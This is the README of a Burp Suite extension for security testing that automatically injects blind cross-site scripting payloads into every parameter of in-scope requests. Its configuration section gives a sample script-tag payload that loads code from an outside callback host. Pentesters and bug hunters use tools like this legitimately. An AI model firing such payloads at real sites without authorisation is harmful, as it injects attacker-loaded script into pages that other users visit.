# BitBlinder

**THIS TOOLS IS IN EARLY BETA USE IT ON YOUR OWN RISK**  
Burp extension helps in finding blind xss vulnerabilities by injecting xss payloads in every request passes throw BurpSuite
```
*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
-  Developer: Ahmed Ezzat (BitTheByte)      -
-  Github:    https://github.com/BitTheByte -
-  Version:   0.05b                         -
*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
[WARNING] MAKE SURE TO EDIT THE SETTINGS BEFORE USE
[WARNING] THIS TOOL WILL WORK FOR IN-SCOPE ITEMS ONLY
[WARNING] THIS TOOL WILL CONSUME TOO MUCH BANDWIDTH
```

# Configuration
Go to `Bit blinder` tab then enable it  
Set your payloads (line separated)  
```
"><script%20src="https://myusername.xss.ht"><script>
"><script%20src="https://myusername.xss.ht"><script>
...
```
If you added more than 1 payload enable the randomization button  
If you want to keep it disabled keep in mind that the tool will use the first payload only


# How to use
1. Load the extension to your burpsuite
2. Click on `Bit blinder` tab then enable it  
3. Add your target to scope **It'll only work for inscope items**
4. Continue your hunting session **Make sure to do alot of actions [Forms,Search,...]**
5. Monitor the output in extension's output tab

**Note:** By the nature of this tool it'll make alot of requests so you may get blocked by WAF or experience slow internet connection


# In a nutshell

When user visits [https://example.com?vuln=123&vuln2=abc](https://example.com?vuln=123&vuln2=abc)  
This tool will generate the following 2 requests (in the background without effecting the current session)  
1. [https://example.com?vuln=[YOUR_XSS_PAYLOAD]&vuln2=abc](https://example.com?vuln=[YOUR_XSS_PAYLOAD]&vuln2=abc)
2. [https://example.com?vuln=123&vuln2=[YOUR_XSS_PAYLOAD]](https://example.com?vuln=123&vuln2=[YOUR_XSS_PAYLOAD])

The previous example also applies to `POST` parameters


# Current version
```
Version 0.05b
```


# TO-DO (By priority)
- GUI ✓ ( A very ugly one for now.. )
- Fix endless request loops ✓
- Injection in headers
- Option to exclude paramters/hosts/endpoints
- Better output/logging system
